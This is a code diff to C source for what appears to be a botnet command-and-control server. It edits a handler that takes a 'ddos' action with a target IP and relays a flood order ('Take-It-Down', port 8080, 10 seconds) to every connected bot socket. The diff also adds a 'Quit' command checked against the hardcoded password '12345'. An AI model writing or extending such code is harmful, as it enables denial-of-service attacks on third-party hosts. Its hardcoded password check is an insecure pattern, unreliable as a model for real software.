@@ -219,18 +219,6 @@ void react( int Socket, const p_threadInfo ti, char *action, char* data, const p
 			free(user);
 	}else if(strcmp(action, "ddos") == 0){
 
-		p_custom_http p = chttp_init();
-		chttp_add_header(p, "Client-Action: Take-It-Down", 27);
-		char buffer[250];
-		size_t n = snprintf(buffer,250,"ip: %s", data);
-		chttp_add_header(p, buffer, n);
-		chttp_add_header(p, "port: 8080", 10);
-		chttp_add_header(p, "seconds: 10", 11);
-
-
-
-
-		chttp_finalise(p, "bleh",4);
 		//
 		// for(size_t i = 0 ; i < p->size ; i++)
 		// 	printf("%c", p->buffer[i]);
@@ -238,10 +226,9 @@ void react( int Socket, const p_threadInfo ti, char *action, char* data, const p
 		size_t size = threadVector_getSize(u->handles);
 		for(size_t i = 0 ; i < size ; i++){
 			int *sock = threadVector_at(u->handles, i);
-			sendAllFixed(*sock, p->buffer, p->size, 0);
+			sendAllFixed(*sock, x->buffer, x->size, 0);
 		}
 
-		chttp_destroy(p);
 		return;
 	}else if(strcmp(action, "List") == 0){
 		// Notify
@@ -296,5 +283,12 @@ void react( int Socket, const p_threadInfo ti, char *action, char* data, const p
 
 		void *t = threadVector_set(u->usernames, nick, at);
 		free(t);
+	}else if(strcmp(action, "Quit") == 0){
+		char *pass = chttp_lookup(x, "Target-Password: ");
+
+		if(strcmp(pass,"12345") == 0){
+			threadQueue_enqueue(u->controllerQueue, "Client-Notify: Please-Quit");
+		}
+		free(pass);
 	}
 }
